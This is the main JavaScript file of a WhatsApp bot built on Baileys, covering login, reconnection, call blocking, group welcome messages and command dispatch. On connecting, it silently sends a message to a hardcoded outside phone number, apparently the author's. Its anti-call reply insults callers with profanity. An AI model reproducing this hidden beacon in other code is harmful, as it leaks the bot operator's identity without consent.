    require("./all/global")
const func = require("./all/place")
const readline = require("readline")
const yargs = require('yargs/yargs')
const _ = require('lodash')
const usePairingCode = true
const question = (text) => {
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
})
return new Promise((resolve) => {
rl.question(text, resolve)
})}

async function startSesi() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const { state, saveCreds } = await useMultiFileAuthState(`./session`)
const { version, isLatest } = await fetchLatestBaileysVersion()
const getMessage = async (key) => {
if (store) {
const msg = await store.loadMessage(key.remoteJid, key.id, undefined)
return msg?.message || undefined
}
return {
conversation: 'hallo '
}}

const connectionOptions = {
    isLatest,
    getMessage,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: !usePairingCode,
    logger: pino({ level: "fatal" }),
    auth: state,
    browser: ['Ubuntu', 'Chrome', '20.0.04']
}
const depulzz = func.makeWASocket(connectionOptions)
if (usePairingCode && !depulzz.authState.creds.registered) {
const phoneNumber = await question(color('Script By depulzz\nMasukan nomornya dibawah berawal 62 :\n', 'white'));
const code = await depulzz.requestPairingCode(phoneNumber.trim())
console.log(`KODE : ${code}`)
}
store.bind(depulzz.ev)

depulzz.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
const reason = new Boom(lastDisconnect?.error)?.output.statusCode
console.log(color(lastDisconnect.error, 'deeppink'))
if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
process.exit()
} else if (reason === DisconnectReason.badSession) {
console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
process.exit()
} else if (reason === DisconnectReason.connectionClosed) {
console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionLost) {
console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionReplaced) {
console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
depulzz.logout()
} else if (reason === DisconnectReason.loggedOut) {
console.log(color(`Device Logged Out, Please Scan Again And Run.`))
depulzz.logout()
} else if (reason === DisconnectReason.restartRequired) {
console.log(color('Restart Required, Restarting...'))
await startSesi()
} else if (reason === DisconnectReason.timedOut) {
console.log(color('Connection TimedOut, Reconnecting...'))
startSesi()
}
} else if (connection === "oke udah") {
console.log(color('bentar...'))
} else if (connection === "open") {
depulzz.sendMessage("6285693507589@s.whatsapp.net", {text: "SCRIPT CONNECTED ?"})
console.log(color(' succesfully connected'))
}
})

depulzz.ev.on('call', async (user) => {
if (!global.anticall) return
let botNumber = await depulzz.decodeJid(depulzz.user.id)
for (let ff of user) {
if (ff.isGroup == false) {
if (ff.status == "offer") {
let sendcall = await depulzz.sendMessage(ff.from, {text: `𝗚𝗔𝗨𝗦𝗔𝗛 𝗡𝗘𝗟𝗣𝗢𝗡 𝗡𝗚𝗘𝗡𝗧𝗢𝗗
Mampus gw blok`, contextInfo: {mentionedJid: [ff.from], externalAdReply: {thumbnailUrl: "https://telegra.ph/file/1241d57517a8363e06d50.jpg", title: "𝐀𝐧𝐭𝐢𝐜𝐚𝐥𝐥 𝐚𝐜𝐭𝐬 !", previewType: "PHOTO"}}}, {quoted: null})
depulzz.sendContact(ff.from, [owner], "Dont Call !", sendcall)
await sleep(8000)
await depulzz.updateBlockStatus(ff.from, "block")
}}
}})

depulzz.ev.on('messages.upsert', async (chatUpdate) => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.key && m.key.remoteJid === 'status@broadcast') return depulzz.readMessages([m.key])
if (!depulzz.public && m.key.remoteJid !== console.log && !m.key.fromMe && chatUpdate.type === 'notify') return
if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
if (global.autoread) depulzz.readMessages([m.key])
m = func.smsg(depulzz, m, store)
require("./Depulzz")(depulzz, m, store)
} catch (err) {
console.log(err)
}
})

depulzz.ev.on('messages.update', async (chatUpdate) => {
        for(const { key, update } of chatUpdate) {
			if (update.pollUpdates && key.fromMe) {
				const pollCreation = await getMessage(key)
				if(pollCreation) {
				    const pollUpdate = await getAggregateVotesInPollMessage({
							message: pollCreation,
							pollUpdates: update.pollUpdates,
						})
	                var toCmd = pollUpdate.filter(v => v.voters.length !== 0)[0]?.name
	                if (toCmd == undefined) return
                    var prefCmd = "."+toCmd
	                depulzz.appenTextMessage(prefCmd, chatUpdate)
				}
			}
		}
    })

depulzz.ev.on('group-participants.update', async (anu) => {
if (!global.welcome) return
let botNumber = await depulzz.decodeJid(depulzz.user.id)
if (anu.participants.includes(botNumber)) return
try {
let metadata = await depulzz.groupMetadata(anu.id)
let namagc = metadata.subject
let participants = anu.participants
for (let num of participants) {
let check = anu.author !== num && anu.author.length > 1
let tag = check ? [anu.author, num] : [num]
try {
ppuser = await depulzz.profilePictureUrl(num, 'image')
} catch {
ppuser = 'https://telegra.ph/file/1241d57517a8363e06d50.jpg'
}
if (anu.action == 'add') {
depulzz.sendMessage(anu.id, {text: check ? `@${anu.author.split("@")[0]} menambahkan @${num.split("@")[0]}` : `Welcome @${num.split("@")[0]}`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© HamxyzTamvan', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
} 
if (anu.action == 'remove') { 
depulzz.sendMessage(anu.id, {text: check ? `@${anu.author.split("@")[0]} mengeluarkan @${num.split("@")[0]}` : `@${num.split("@")[0]} telah keluar`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© HamxyzTamvan', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
}
if (anu.action == "promote") {
depulzz.sendMessage(anu.id, {text: `@${anu.author.split("@")[0]} menjadikan @${num.split("@")[0]} sebagai admin`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© HamxyzTamvan', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
}
if (anu.action == "demote") {
depulzz.sendMessage(anu.id, {text: `@${anu.author.split("@")[0]} memberhentikan @${num.split("@")[0]} sebagai admin`, 
contextInfo: {mentionedJid: [...tag], externalAdReply: { thumbnailUrl: ppuser, title: '© HamxyzTamvan', body: '', renderLargerThumbnail: true, sourceUrl: linkgc, mediaType: 1}}})
}
} 
} catch (err) {
console.log(err)
}})

depulzz.public = true

depulzz.ev.on('creds.update', saveCreds)
return depulzz
}

startSesi()

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})